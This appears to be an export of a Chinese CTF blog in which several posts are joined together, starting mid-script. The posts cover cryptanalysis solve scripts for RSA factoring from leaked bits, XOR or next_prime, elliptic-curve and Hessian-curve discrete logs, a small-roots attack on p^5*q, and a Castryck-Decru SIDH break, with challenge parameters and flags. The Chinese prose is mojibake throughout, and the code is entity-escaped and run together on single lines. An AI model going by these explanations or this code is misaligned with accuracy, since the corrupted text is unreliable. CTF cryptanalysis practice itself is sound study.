\u0026#34;0\u0026#34;): strp.append(\u0026#34;1\u0026#34;) elif(strgift1[i] == \u0026#34;1\u0026#34; and strmask[i] == \u0026#34;1\u0026#34;): strp.append(\u0026#34;0\u0026#34;) else: strp.append(\u0026#34;0\u0026#34;) p = int(\u0026#34;\u0026#34;.join(strp),2) q= n//p phi = (p-1)*(q-1) d = inverse(e,phi) m = pow(c,d,n) print(long_to_bytes(m)) 2\nprint(f\u0026#39;mask1 = {mask1}\u0026#39;)\rprint(f\u0026#39;mask2 = {mask2}\u0026#39;)\rprint(f\u0026#39;h1 = {p\u0026amp;mask1}\u0026#39;)\rprint(f\u0026#39;h2 = {q\u0026amp;mask2}\u0026#39;) æ€è·¯\n\u0026amp;è¿ç®—ä¸º1ï¼Œåˆ™pè¯¥ä½å¿…ä¸º1 \u0026amp;è¿ç®—ä¸º0ï¼Œmaskè¯¥ä½ä¸º1ï¼Œåˆ™pè¯¥ä½å¿…ä¸º0 è€Œå½“\u0026amp;è¿ç®—ä¸º0ï¼Œmaskä¹Ÿä¸º0æ—¶ï¼Œpçš„è¯¥æ¯”ç‰¹ä½å°±å­˜åœ¨ä¸¤ç§ç»“æœï¼Œæ— æ³•å®Œå…¨ç¡®å®šã€‚å¯æ˜¯è¿™é¢˜ä¸ä»…ç»™äº†pï¼Œè¿˜ç»™äº†qçš„ä½è¿ç®—ç»“æœï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä¸‹é¢è¿™ä¸€ç‚¹ä¿¡æ¯ï¼Œä»é«˜ä½å‘ä½ä½è¿›è¡Œæ·±åº¦ä¼˜å…ˆæœç´¢ï¼Œæ˜¾è‘—é™ä½å¤æ‚åº¦ï¼š\n1ã€å°†pã€qå½“å‰ç¡®å®šçš„äºŒè¿›åˆ¶ä½åæ–¹å…¨éƒ¨å¡«å……0ï¼Œç›´è‡³å¡«æ»¡512ä½ï¼Œæ­¤æ—¶pã€qä¹˜ç§¯åº”å°äºnã€‚\n2ã€å°†pã€qå½“å‰ç¡®å®šçš„äºŒè¿›åˆ¶ä½åæ–¹å…¨éƒ¨å¡«å……1ï¼Œç›´è‡³å¡«æ»¡512ä½ï¼Œæ­¤æ—¶pã€qä¹˜ç§¯åº”å¤§äºnã€‚\nå·ä»£ç \nh1[l] == \u0026#34;1\u0026#34;) and (mask2[l] == \u0026#34;0\u0026#34; and h2[l] == \u0026#34;0\u0026#34;)): find(p+\u0026#34;1\u0026#34;,q+\u0026#34;0\u0026#34;) find(p+\u0026#34;1\u0026#34;,q+\u0026#34;1\u0026#34;) elif((mask1[l] == \u0026#34;1\u0026#34; and h1[l] == \u0026#34;0\u0026#34;) and (mask2[l] == \u0026#34;1\u0026#34; and h2[l] == \u0026#34;1\u0026#34;)): find(p+\u0026#34;0\u0026#34;,q+\u0026#34;1\u0026#34;) elif((mask1[l] == \u0026#34;1\u0026#34; and h1[l] == \u0026#34;0\u0026#34;) and (mask2[l] == \u0026#34;1\u0026#34; and h2[l] == \u0026#34;0\u0026#34;)): find(p+\u0026#34;0\u0026#34;,q+\u0026#34;0\u0026#34;) elif((mask1[l] == \u0026#34;1\u0026#34; and h1[l] == \u0026#34;0\u0026#34;) and (mask2[l] == \u0026#34;0\u0026#34; and h2[l] == \u0026#34;0\u0026#34;)): find(p+\u0026#34;0\u0026#34;,q+\u0026#34;1\u0026#34;) find(p+\u0026#34;0\u0026#34;,q+\u0026#34;0\u0026#34;) elif((mask1[l] == \u0026#34;0\u0026#34; and h1[l] == \u0026#34;0\u0026#34;) and (mask2[l] == \u0026#34;1\u0026#34; and h2[l] == \u0026#34;1\u0026#34;)): find(p+\u0026#34;0\u0026#34;,q+\u0026#34;1\u0026#34;) find(p+\u0026#34;1\u0026#34;,q+\u0026#34;1\u0026#34;) elif((mask1[l] == \u0026#34;0\u0026#34; and h1[l] == \u0026#34;0\u0026#34;) and (mask2[l] == \u0026#34;1\u0026#34; and h2[l] == \u0026#34;0\u0026#34;)): find(p+\u0026#34;0\u0026#34;,q+\u0026#34;0\u0026#34;) find(p+\u0026#34;1\u0026#34;,q+\u0026#34;0\u0026#34;) elif((mask1[l] == \u0026#34;0\u0026#34; and h1[l] == \u0026#34;0\u0026#34;) and (mask2[l] == \u0026#34;0\u0026#34; and h2[l] == \u0026#34;0\u0026#34;)): find(p+\u0026#34;0\u0026#34;,q+\u0026#34;0\u0026#34;) find(p+\u0026#34;0\u0026#34;,q+\u0026#34;1\u0026#34;) find(p+\u0026#34;1\u0026#34;,q+\u0026#34;0\u0026#34;) find(p+\u0026#34;1\u0026#34;,q+\u0026#34;1\u0026#34;) tempp = \u0026#34;\u0026#34; tempq = \u0026#34;\u0026#34; #find(tempp,tempq) P = 10172774442863868719013872884099170294615753094066736187886125116462340120031133533430755779832487215255546434139069419394249074006281284289077492708469893 Q = 8580050824978592226795441601299432164577158891190171233964440597982925469924083252289609500726234367555160732119333211934059529993446003001925910065317613 phi = (P-1)*(Q-1) d = inverse(e,phi) m = pow(c,d,n) print(long_to_bytes(m)) hint = sqrt(p) ^ sqrt(q) # hint = sqrt(p) ^ sqrt(q)\nhttps://tangcuxiaojikuai.xyz/post/795314c1.html\np*qã€p^q 2 # æ‰€ä»¥æ ¹æ®è¿™ä¸ªçˆ†ç ´ä¸€ä¸‹på’Œq,næ˜¯4096ä½ï¼Œp^qæ˜¯2047ä½ä¹˜2æ˜¯4094ä½æ˜¾ç„¶på’Œqçš„æœ€é«˜ä½éƒ½æ˜¯1å¼‚æˆ–å€¼æ˜¯0\nn = 568511...... e = 65537 p_xor_q = 14888341604... def getpq(p,q, i): if p*q \u0026gt; n: #print(\u0026#39;A\u0026#39;, i) return tail = (1\u0026lt;\u0026lt;i)-1 #åiä½ç½®1 if (p|tail)*(q|tail) \u0026lt; n: #print(\u0026#39;B:\u0026#39;, i, hex(p|tail), hex(q|tail)) return if p*q == n: print(\u0026#39;p=\u0026#39;,p) print(\u0026#39;q=\u0026#39;,q) return i -= 1 if p_xor_q \u0026amp; (1\u0026lt;\u0026lt;i) == 0: getpq(p^(1\u0026lt;\u0026lt;i), q^(1\u0026lt;\u0026lt;i), i) getpq(p,q,i) else: getpq(p^(1\u0026lt;\u0026lt;i), q, i) getpq(p,q^(1\u0026lt;\u0026lt;i),i) print(n.bit_length(), p_xor_q.bit_length()) #4096 2047 import sys sys.setrecursionlimit(3000) getpq(3\u0026lt;\u0026lt;2046,1\u0026lt;\u0026lt;2047, 2046) ","date":"4 November 2023","permalink":"/articles/rsaallintwo/","section":"Projects","summary":"rsa all in two # leak (p^q)\u0026raquo;nbits # from Crypto.","title":"rsa all in two"},{"content":"","date":"4 November 2023","permalink":"/tags/","section":"Tags","summary":"","title":"Tags"},{"content":"\r10æœˆå°ç»“ # githubå·è¢«å°äº†ï¼ŒæŠ‘éƒäº†ã€‚è¢«é˜¿ç¾è‰å¡ç‹ ç‹ å¡è„–å­äº†\nå›¾åºŠå…¨çº¿å´©æºƒ\næ±‚æ±‚ä½ ç»™æˆ‘è§£å°äº†å§\næ±‚æ±‚ä½ äº†æ±‚æ±‚ä½ äº†ï¼ˆå¡”è²æ±‚é¥¶.jpgï¼‰\nåå­æ¯ # next-prime-task # ç”Ÿæˆæœºç»„æ•°æ®å‘ç°å¯¹Nç›´æ¥å¼€æ–¹å¾—åˆ°å¯ä»¥å¾—åˆ°pæˆ–qçš„è¿‘ä¼¼å€¼pd\nå¤šæ¬¡æµ‹è¯•åå‘ç°è¿™ä¸ªpdå’Œpç»å¯¹å€¼çš„å·®ä¸ä¼šå¤§äº1000äºæ˜¯å¯¹pdå‡å»1000åçˆ†ç ´å¾—åˆ°p1 nextprimeå¾—åˆ°p2\næŠ½è±¡\u0026hellip;\nfrom Crypto.Util.number import * from gmpy2 import next_prime, iroot from flag import flag assert flag[0:4]==b\u0026#39;flag\u0026#39; m = bytes_to_long(flag) assert size(m)\u0026lt;500 p = getPrime(512) q = next_prime(p) n = p * q print(\u0026#39;n=\u0026#39;, n\u0026gt;\u0026gt;520) e = 0x10001 c = pow(m, e, n) print(\u0026#39;c=\u0026#39;, c) \u0026#39;\u0026#39;\u0026#39; n= 28576274811010794362153160897556935178530640825011441539841241257190782139295561904323347128956873569754645071205043238985141474388531008367238218822591 c= 49502875285578675438052554215266678403659290915102322948363030271494959804587081871467110614683972929037615883922743651431683465100061968204901334627149795829429950385848753728500177164800064208215503246868631076011505268371936586645321659884527055007299822625570713613996139223348709621258028349513737798120 \u0026#39;\u0026#39;\u0026#39; from Crypto.Util.number import * from gmpy2 import * # n= 16212823795921249015201513720149784272087058934998256111313253824205027920859214121063981513487904645940216957428441144762656821271607914704124385625054 # c= 42623448757142425965793058163308735025128962287288212456406034320792801149338160716972860425304842585118914774556604523599336877170146028573856917845178178543459331490175081849764083076168568374304256040399932392040329806010797252107241692940719624357821612728032794873653073208064739506588169944780568217733 e = 0x10001 n= 28576274811010794362153160897556935178530640825011441539841241257190782139295561904323347128956873569754645071205043238985141474388531008367238218822591 c= 49502875285578675438052554215266678403659290915102322948363030271494959804587081871467110614683972929037615883922743651431683465100061968204901334627149795829429950385848753728500177164800064208215503246868631076011505268371936586645321659884527055007299822625570713613996139223348709621258028349513737798120 N = n\u0026lt;\u0026lt;520 pd = iroot(N,2)[0] p1 = pd -10000 for i in range(1000): p1 = next_prime(p1) p2 = next_prime(p1) tmp = (p1*p2)\u0026gt;\u0026gt;520 if(tmp == n): print(tmp - n) print(i) n1 = p1*p2 phi = (p1-1)*(p2-1) d = inverse(e,phi) m1 = pow(c,d,n1) print(long_to_bytes(m1)) EC_Party-I-chall # ç‹ æ´»\nhitcon2022 Chimera\nå°†orderçš„ä¸€ä¸ªå°å› å­é™¤æ‰å†ä¹˜ä»¥E(C)ï¼Œå¯èƒ½ä¼šäº§ç”Ÿkp mod nçš„æƒ…å†µï¼Œè¿™ä¼šè®©sagemathæŠ¥é”™ï¼Œæˆ‘ä»¬å¾—ä»¥çœ‹åˆ°kpçš„å€¼ï¼š\nè¯•è¯•è„šæœ¬\nge/structure/element.c:15686)\rFile \u0026#34;/usr/lib/python3/dist-packages/sage/schemes/elliptic_curves/ell_point.py\u0026#34;, line 679, in _add_\rraise ZeroDivisionError(\u0026#34;Inverse of %s does not exist (characteristic = %s = %s*%s)\u0026#34; % (x1-x2, N, N1, N2))\rZeroDivisionError: Inverse of 399142328555769122684976351600136585680104999923110415867753480206443969280985877697850841401824368944437043138064030332535786936031074694422398245233538680969600520572361311820112559527089421156024161654714350513598626449030622660 does not exist (characteristic = 762981334990685089884160169295988791471426441106522959345412318178660817286272606245181160960267776171409174142433857335352402619564485470678152764621235882232914864951345067231483720755544188962798600739631026707678945887174897543 = 37474009785980474658135106783131904659818035950984079581009709986840194575036321428945132957079423328996508289872067*20360280080732821723376422808980005582531004028308560803397168572148594993701208369640640375361387495696068328462829) åš¯åš¯ å¥½å®¶ä¼™ï¼Œè¿˜çœŸæœ‰ kp mod nçš„æƒ…å†µï¼Œå¤ªéœ‡æ’¼äº†\ngcdä¸€ä¸‹å°±æœ‰\ndq = inverse_mod(2,oq) å¯ä»¥ç›´æ¥ç®—dq\ndpå’Œ2äº’ç´ äº† æˆ‘æ„¿æ„ç§°ä¹‹ä¸ºecc rabin æ„å»ºå…¬å¼\n$$ f = (3x^2+a)^2-2x(4(x^3+ax+b))-C[0]4(x^3+ax+b) $$\nåªçœ‹å‡ºæ¥æ˜¯ä¸ªå¯¹xæ±‚åå¯¼åçš„å¼å­ï¼Œæ²¡çœ‹æ‡‚ä¸ºå•¥è¿™æ ·ï¼Œæ‘†äº†\nå·ä¸ªè„šæœ¬\nfrom Crypto.Util.number import * a,b,n,C = 138681122158674534796479818810828100269024674330030901179877002756402543027343312824423418859769980312713625658733, 4989541340743108588577899263469059346332852532421276369038720203527706762720292559751463880310075002363945271507040, 762981334990685089884160169295988791471426441106522959345412318178660817286272606245181160960267776171409174142433857335352402619564485470678152764621235882232914864951345067231483720755544188962798600739631026707678945887174897543, (19591102741441427006422487362547101973286873135330241799412389205281057650306427438686318050682578531286702107543065985988634367524715153650482199099194389191525898366546842016339136884277515665890331906261550080128989942048438965, 728465071542637655949094554469510039681717865811604984652385614821789556549826602178972137405550902004858456181137844771163710123158955524137202319902378503104952106036911634918189377295743976966073577013775200078470659428344462772) E = EllipticCurve(Zmod(n),[a,b]) C = E(C) order = 762981334990685089884160169295988791471426441106522959345445792076415993922016249232021560266153453470937452118572318136597282436269660557904217923887981072203978473274822142705255987334355747997513083011853917049784914749699536828 # fac ord_p*ord_q # o = order // 8452217 # print(C*o) # for i in range(1,10000): # tt = (order//i)*C # 399142328555769122684976351600136585680104999923110415867753480206443969280985877697850841401824368944437043138064030332535786936031074694422398245233538680969600520572361311820112559527089421156024161654714350513598626449030622660 # p = GCD(n,kp) p = 37474009785980474658135106783131904659818035950984079581009709986840194575036321428945132957079423328996508289872067 q = n//p assert p*q == n Ep = EllipticCurve(Zmod(p),[a,b]) Eq = EllipticCurve(Zmod(q),[a,b]) #print(Ep.order()) #print(Eq.order()) op = 37474009785980474658135106783131904659818035950984079581012533947688268013671227793391417023914911897089093262951596 oq = order // op dq = inverse_mod(2,oq) mq = dq*Eq(C) print(Ep(C)) R.\u0026lt;x\u0026gt; = PolynomialRing(GF(p)) f = (3*x^2+a)^2-2*x*(4*(x^3+a*x+b))-C[0]*4*(x^3+a*x+b) for i in (f.roots()): print(long_to_bytes(crt([int(i[0]),int(mq[0])],[p,q]))) print(\u0026#39;done\u0026#39;) # 3crab1n_s0unds_go0d é¦™å±±æ¯ lift # import os import gmpy2 from Crypto.Util.number import * import random from secrets import flag def pad(s,l): return s + os.urandom(l - len(s)) def gen(): g = getPrime(8) while True: p = g * random.getrandbits(138) + 1 if isPrime(p): break while True: q = g * random.getrandbits(138) + 1 if isPrime(q): break N = p ** 5 * q phi = p ** 4 * (p - 1) * (q - 1) d = random.getrandbits(256) e = inverse(d, phi) E = e * g hint = gmpy2.gcd(E, phi) return N, E, hint flag = pad(flag,64) m = bytes_to_long(flag) n,e,hint = gen() c = pow(m,e,n) print(f\u0026#39;hint = {hint}\u0026#39;) print(f\u0026#39;n = {n}\u0026#39;) print(f\u0026#39;e = {e}\u0026#39;) print(f\u0026#39;c = {c}\u0026#39;) hint = 251 n = 108960799213330048807537253155955524262938083957673388027650083719597357215238547761557943499634403020900601643719960988288543702833581456488410418793239589934165142850195998163833962875355916819854378922306890883033496525502067124670576471251882548376530637034077 e = 3359917755894163258174451768521610910491402727660720673898848239095553816126131162471035843306464197912997253011899806560624938869918893182751614520610693643690087988363775343761651198776860913310798127832036941524620284804884136983215497742441302140070096928109039 c = 72201537621260682675988549650349973570539366370497258107694937619698999052787116039080427209958662949131892284799148484018421298241124372816425123784602508705232247879799611203283114123802597553853842227351228626180079209388772101105198454904371772564490263034162 å› ä¸º\n$$ \\phi(n)=p^4*(r_1 r_2g^2)=0(\\ mod \\ p^4) $$\næ‰€ä»¥\n$$ ed-1=k\\phi(n)=0 mod \\ p^4 $$\næ­¤æ—¶256å¤§å°çš„då°±å¯ä»¥ç”¨small rootæ±‚å‡ºæ¥äº†\næ±‚å¾—på’Œqåï¼Œå› ä¸ºeå’Œphiï¼ˆpï¼‰phiï¼ˆqï¼‰\nä¸äº’ç´ ï¼Œè¿™é‡Œçš„æƒ…å†µå’Œ*CTF 2021 little case ç±»ä¼¼ï¼Œdecrypt2å¤„ç†\n$$ phip = p ^ 4 * (p - 1) $$\nä¸€å¼€å§‹æ²¡æƒ³é€šï¼Œä½†å…¶å®å’Œdecrypté‡Œé¢æ˜¯ä¸€æ ·çš„\nç”¨AMMåº”è¯¥ä¹Ÿå¯ä»¥è§£\nexp\nfrom Crypto.Util.number import * import itertools hint = 251 n = 108960799213330048807537253155955524262938083957673388027650083719597357215238547761557943499634403020900601643719960988288543702833581456488410418793239589934165142850195998163833962875355916819854378922306890883033496525502067124670576471251882548376530637034077 e = 3359917755894163258174451768521610910491402727660720673898848239095553816126131162471035843306464197912997253011899806560624938869918893182751614520610693643690087988363775343761651198776860913310798127832036941524620284804884136983215497742441302140070096928109039 c = 72201537621260682675988549650349973570539366370497258107694937619698999052787116039080427209958662949131892284799148484018421298241124372816425123784602508705232247879799611203283114123802597553853842227351228626180079209388772101105198454904371772564490263034162 e //= hint RP.\u0026lt;x\u0026gt; = PolynomialRing(Zmod(n)) f = e*x -1 f = f.monic() x0 = f.small_roots(X = 2^256,beta = 0.4) print(x0) x0 = 39217838246811431279243531729119914044224429322696785472959081158748864949269 p4 = GCD(x0*e-1,n) # 23153425300889483483553551112335873301449089474555179592930187730428387181422112282990079197590872977617830286073037301064978277511828551780538222539198674709759058026997715121 # print(gmpy2.iroot(int(p4),int(4))) # (mpz(69367143733862710652791985332025152581988181), True) p = 69367143733862710652791985332025152581988181 q = n // p ^ 5 phi = p ^ 4 * (p - 1) * (q - 1) d= inverse(e,phi) # 39217838246811431279243531729119914044224429322696785472959081158748864949269 cp = c % p^5 cq = c % q e = e*hint def decrypt2(p,c,e): phip = p ^ 4 * (p - 1) w = GCD(e,phip) p1 = phip // w b = inverse(e,p1) g = get_oneroot2(p,w) m = pow(c,b,p^5) mps = [ZZ(m*g^i) for i in range(w)] return mps def get_oneroot2(p,w): while 1: Zp = Zmod(p^5) g = Zp.random_element() g = g^(p^4*(p-1)//w) for i in divisors(w): if(i != w): g2 = g^i if(g2 ==1): break else: # break return g mps = decrypt2(p,cp,e) def get_oneroot(p,w): while 1: Zp = Zmod(p) g = Zp.random_element() g = g^((p-1)//w) for i in divisors(w): if(i != w): g2 = g^i if(g2 ==1): break else: return g def decrypt(p,c,e): phip = p-1 w = GCD(e,phip) p1 = phip//w b = inverse(e,p1) g = get_oneroot(p,w) m = pow(c,b,p) return [ZZ(m*g^i) for i in range(w)] mqs = decrypt(q,cq,e) for mp, mq in itertools.product(mps, mqs): m = crt([mp, mq], [p^5, q]) msg = long_to_bytes(int(m)) if (b\u0026#39;flag\u0026#39; in msg): print(msg) å®‰å“åŠ¨æ€è°ƒè¯• # jeb-demo-4.16.0\nç…§ç€çœ‹é›ªçš„æ•™ç¨‹æ”¹ä¸€ä¸‹å°±èƒ½è·‘\næœºå™¨ï¼šoneplus7T\nOSï¼šlineageOS\nè°ƒäº†ä¸¤ä¸ªæ²¡æ··æ·†çš„é¢˜ï¼Œæ²¡ä»€ä¹ˆæ„æ€ï¼Œgithubå›¾åºŠç‚¸äº†ï¼Œä¸æ”¾å›¾äº†\n","date":"21 September 2023","permalink":"/articles/10month/","section":"Projects","summary":"10æœˆå°ç»“ # githubå·è¢«å°äº†ï¼ŒæŠ‘éƒäº†ã€‚è¢«é˜¿ç¾è‰å¡ç‹ ç‹ å¡è„–å­äº†","title":"10æœˆå°ç»“"},{"content":"","date":"21 September 2023","permalink":"/categories/ctf/","section":"Categories","summary":"","title":"CTF"},{"content":"\rhttps://github.com/ljahum/crypto-challenges/tree/main/2023/cryptoCTF2023\nBarak # æ¤­åœ†æ›²çº¿ç‹ æ´»\nHessian Curve\n$$ x^3 + y^3 +c - Dxy =0 \\ (mod \\ p) $$\nå…ˆæ£€æŸ¥æ˜¯ä»€ä¹ˆæ›²çº¿\nhttps://www.hyperelliptic.org/EFD/\nHessian curves: x3+y3+1=3*d*x*y æ‰€ä»¥ç†è«–ä¸Šå¯ä»¥æ‰¾ paper çœ‹çœ‹æœ‰æ²’æœ‰å¯«è½‰å› Weierstrass form çš„å…¬å¼\nå¸¸è§„ECCæ›²çº¿\rShort Weierstrass curves: y2=x3+a*x+b EllipticCurve_from_cubic # å¯ä»¥ç”¨ sage å…§å»ºçš„ EllipticCurve_from_cubic ä¾†åš\nä½†è¿™ä¸ªå‡½æ•°åªèƒ½æ¥å—a homogeneous cubic in three variables with rational coefficients æ‰è¡Œã€‚\næ‰€ä»¥æˆ‘ä»¬è¦å…ˆå»ºç«‹ä¸€ä¸ªåˆä¸‰å‚æ•°çš„cubicå¼å­ï¼Œç„¶ååˆ©ç”¨æŠ•å½±çš„æ–¹æ³•\nå°†å…¶å˜æ¢åˆ°åªéœ€è¦x yä¹Ÿèƒ½å¤Ÿæ‰¾åˆ°ç‚¹çš„å½¢å¼\nå…ˆå¢åŠ ä¸€ä¸ªZå‚æ•°ç„¶ååˆ©ç”¨åœ¨è€ƒæ•°ä¸€ä¹‹å‰å­¦ä¹ çš„ä½“ç§¯åˆ†çš„æŠ€å·§ï¼Œ\rå°† F(x,y,z)æ˜ å°„åˆ°Fz(x,y) è®¡ç®—è¡¨è¾¾å¼ $$ (X\u0026rsquo;,Y\u0026rsquo;,Z\u0026rsquo;) $$\nç”¨åå¾®åˆ†çš„è¡¨è¾¾å¼è®¡ç®—æŠ•å½±æ–¹ç¨‹xå’Œyçš„è¡¨è¾¾å¼\nä»¤z=1\n$$ x = x\u0026rsquo;/z\u0026rsquo; \\\\ y = x\u0026rsquo;/z\u0026rsquo; \\\\ z = 1 \\\\ z\u0026rsquo;/z\u0026rsquo; = 1 $$\nfrom Crypto.Util.number import long_to_bytes p = 73997272456239171124655017039956026551127725934222347 d = 68212800478915688445169020404812347140341674954375635 c = 1 F = GF(p) x, y, z = QQ[\u0026#34;x,y,z\u0026#34;].gens() eq = x ^ 3 + y ^ 3 + c * z ^ 3 - d * x * y * z phi = EllipticCurve_from_cubic(eq) E = phi.codomain().change_ring(GF(p)) P = ( 71451574057642615329217496196104648829170714086074852, 69505051165402823276701818777271117086632959198597714, ) Q = ( 40867727924496334272422180051448163594354522440089644, 56052452825146620306694006054673427761687498088402245, ) fx, fy, fz = map(lambda f: f.change_ring(F), phi.defining_polynomials()) // è®¾ç½®x y z è¿›å»å‡½æ•°åçš„è¿ç®—æ–¹æ³• phiP = lambda x, y, z=1: E(fx(x, y, z) / fz(x, y, z), fy(x, y, z) / fz(x, y, z)) EP = phiP(*P) EQ = phiP(*Q) x = discrete_log(EQ, EP, operation=\u0026#34;+\u0026#34;) print(x) od = EP.order() # the generator doesn\u0026#39;t have full order print( [ flag for i in range(E.order() // od) if (flag := long_to_bytes(int(x + od * i))).isascii() ] ) # CCTF{_hE5S!4n_f0rM_0F_3CC!!} é€šå¼ # $$ D = d3 \\\\ a = -27D(D^3 + 8) \\\\ b = 54(D^6 - 20D^3 - 8) \\\\ $$\np = 73997272456239171124655017039956026551127725934222347 G = GF(p) d = G(68212800478915688445169020404812347140341674954375635) D = d/3 c = 1 # Hessian Curve: # xÂ³ + yÂ³ + 1 = 3Dxy # Weierstrass equivalent a = -27*D*(D^3 + 8) b = 54*(D^6 - 20*D^3 - 8) E2 = EllipticCurve(G, [a, b]) print(E2) # Elliptic Curve defined by y^2 = x^3 + 44905983883632632311912975168565494049729462391119290*x + 4053170785171018449128623853386306889464200866918538 over Finite Field of size 73997272456239171124655017039956026551127725934222347 order = E2.order() # 73997272456239171124655016995459084401465136460086688 Keymoted # p å’Œ qæœ‰ä¸¤ä¸ªbitä¸ä¸€æ ·ï¼Œä½†ä½ç½®å·²çŸ¥ï¼Œè€Œä¸”æ˜¯flipçš„å…³ç³»\né€»è¾‘\nP-\u0026gt;|flipä¸¤ä¸ªbit|-\u0026gt;S-\u0026gt;|next pri|-\u0026gt;Q å¼¯å¼¯çˆ·çš„æ€è·¯\nç”±äºnbit - 1ä½ç½®ä¸€å®šæ˜¯1ï¼Œflipç›¸å½“äºå‡å» $$ nbit-1=a\\ 2^{nbit-1}=2^a $$\nä¸­é—´å˜é‡ $$ p\u0026rsquo; = p-2^a $$\nå¯ä»¥æœ‰ç¯é¥° $$ p =p\u0026rsquo;+2^a\\ p =p\u0026rsquo;\\plusmn 2^a\\ q = 2s+t+1\\ $$ 1+tå¾ˆå°ï¼Œçˆ†ä¸€ä¸‹å°±æ˜¯è§£æ–¹ç¨‹äº†\nsage\nfrom Crypto.Util.number import long_to_bytes pkey = ( 6660938713055850877314255610895820875305739186102790477966786501810416821294442374977193379731704125177528590285016474818841859956990486067573436301232301, 65537, 5539256645640498184116966196249666621079506508209770360679460869295427007578, 20151017657582479433586370393795140515103572865771721775868586710594524816458, ) encx = 6641320679869421443758875467781930795132746694454926965779628505713445486895274490835545942727970688359873955019634877304270220728625521646208912044469433 ency = 2856872654927815636828860866843721158889474116106462420201092148493803550131351543372740950198853438539317164093538508795630146854596724019329887894933972 n, e, a, b = pkey nbit = 256 pp = ZZ[\u0026#34;pp\u0026#34;].gen() p = 2 ** (nbit - 1) + pp s = pp + 2 ** (nbit // 2) # guess for t in range(1000): q = 2 * s + 1 + t f = p * q - n rs = f.roots() if rs: print(t, rs) break p = 2 ** (nbit - 1) + rs[0][0] q = n // p assert p * q == n Z = Zmod(n) E = EllipticCurve(Z, [a, b]) C = E(encx, ency) Ep = EllipticCurve(GF(p), [a, b]) Eq = EllipticCurve(GF(q), [a, b]) od = Ep.order() * Eq.order() d = pow(e, -1, od) M = d * C print(long_to_bytes(int(M.xy()[0]))) Z3\npkey = (6660938713055850877314255610895820875305739186102790477966786501810416821294442374977193379731704125177528590285016474818841859956990486067573436301232301, 65537, 5539256645640498184116966196249666621079506508209770360679460869295427007578, 20151017657582479433586370393795140515103572865771721775868586710594524816458) enc = (6641320679869421443758875467781930795132746694454926965779628505713445486895274490835545942727970688359873955019634877304270220728625521646208912044469433,2856872654927815636828860866843721158889474116106462420201092148493803550131351543372740950198853438539317164093538508795630146854596724019329887894933972,1) nbit = 256 n,e,a,b = pkey from z3 import * k1 = 2 ** (nbit - 1) k2 = 2 ** (nbit // 2) for i in range(0,2000,2): print(i) s= Solver() p = BitVec(\u0026#39;p\u0026#39;, 256) q = 2*(p+k1+k2)+1+i #4ç§æƒ…å†µ ç¬¬1ç§æƒ…å†µi=2æœ‰è§£ s.add(p*q == n) if s.check() == sat: tp = s.model()[p].as_long() if n%tp == 0: print(tp) p = 93511613846272978051774379195449772332692693333173612296021789501865098047641 q = 71231138455229760679977773382211636812795966734548537479512744210680602878261 ASIv1 # ä¸‰è¿›åˆ¶å¥½æ´»\nè®°ä¸€ä¸‹ åˆ«å¿˜äº†GF(p)çŸ©é˜µçš„ä¼ ç»Ÿæ‰‹è‰º\nfrom output import * MR = matrix(GF(3), R) MS = matrix(GF(3),12100,1, S) a = MR.solve_right(MS) flag = \u0026#39;\u0026#39;.join([str(a[i,0]) for i in range(110)]) #\u0026#39;12200101122112210002110212001112001011210012200110200221111110001002012120200110211202001221221020201121010111\u0026#39; bytes.fromhex(hex(int(flag,3))[2:]) b\u0026#39;3Xpl0i7eD_bY_AtT4ck3r!\u0026#39; #CCTF{3Xpl0i7eD_bY_AtT4ck3r!} æ±‚eccä¸Šçš„Q/2 # æ²¡æœ‰è®¾ç½® gf(P)å°±æ— æ‰€è°“ä»€ä¹ˆç¦»æ•£æ€§äº†\n# y^2 = x^3 - 76479349401*x # Q = (2740238460026645848168554718863025/9496587522097110856052646144 : -40938233945632940227696869615241088990456963438185/925446596757862314622073825244539026870272 : 1) E = EllipticCurve(QQ, [-76479349401, 0]) Q = E( 2740238460026645848168554718863025 / 9496587522097110856052646144, -40938233945632940227696869615241088990456963438185 / 925446596757862314622073825244539026870272, ) for x in Q.division_points(2): print(\u0026#34;,\u0026#34;.join(map(str, x.xy()))) # CCTF{H4lVin9_pO!ntS_0n_3lLipT1C_cuRve5!} An efficient key recovery attack on SIDH # Supersingular Isogeny Diffie-Hellman protocol (SIDH)\nè¿™æ˜¯ä»€ä¹ˆï¼Ÿä¸çŸ¥é“\næ‰“å°±å®Œäº‹äº†\nç‰¹å¾å‚æ•°\n$$ y^2=x^3+x\\ y^2=x^3+6x^2+x\\ $$\na, b = gen_param(190) p = 2**a * 3**b - 1 F.\u0026lt;x\u0026gt; = GF(p^2, modulus = x**2 + 1) EC = EllipticCurve(F, [0, 6, 0, 1, 0]) P, Q, R, S = gen_tpt(EC, a, b) print(f\u0026#39;P = {P.xy()}\u0026#39;) print(f\u0026#39;Q = {Q.xy()}\u0026#39;) print(f\u0026#39;R = {R.xy()}\u0026#39;) print(f\u0026#39;S = {S.xy()}\u0026#39;) skey, _phi_dom, _phi_P, _phi_Q = keygen(EC, b, P, Q, R, S) 22å¹´çš„ç‹ æ´»\nexamlp:\nhttps://github.com/GiacomoPope/Castryck-Decru-SageMath/blob/main/baby_SIDH.sage\nexamlp\nfrom Crypto.Util.number import long_to_bytes from Crypto.Cipher import AES from hashlib import md5 from public_values_aux import generate_distortion_map load(\u0026#34;./castryck_decru_shortcut.sage\u0026#34;) x = QQ[\u0026#34;x\u0026#34;].gen() P = ( 3799366067639160994711391413511701264777392349807255916259320256251336249666 * x + 633884628131689177031068067897867565283026098415356709331881575255526844055, 3967348484864888240941807454988077684669074109524399477973520952727771366997 * x + 2712354532382043232096058211997452093712477916671679907467703464009558475387, ) Q = ( 560486392227142181240528415381730657098132581407794833013161975335122628946 * x + 3215971074127995409351672272900519761566156375365764079386358523254177565572, 2231746347912007096335360835242707156884468521076802738444724241125548841199 * x + 1147378568798166954853288670809304301194478550602719730593160186622788033023, ) R = ( 2656280316115888204975052029900945854050191685154131031859911335618240136443 * x + 1127449111197960889758916770042950976852995868310602942974825430779982061546, 3477289737920472771668877366806058236254602770820629911886593813749930497839 * x + 4646016633241840360901490323351236375375727836768954121794139000985805816564, ) S = ( 2403139149412141532587482679318245468078604585804423116505024414375742701912 * x + 2772488504607240668919423445309052101443116827322741849326656561794480962717, 3356599382898540527962106232860239304405841217130774924490318752448476310798 * x + 2818004736373436361527915593539097434287090434842750370886675729711731978922, ) # def eq(x, y): # return y^2 -(x^3+6*x^2+1*x) # eqs = [eq(*P) for P in (P, Q, R, S)] # pmul = gcd(eqs[0].resultant(eqs[1]), eqs[2].resultant(eqs[3])) # print(factor(pmul)) p = 